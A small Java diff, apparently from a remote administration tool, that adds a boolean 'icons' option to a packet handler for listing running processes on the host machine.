@@ -13,6 +13,8 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
+		boolean icons = con.readBoolean();
+		
 		try {
 			Process p = null;
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
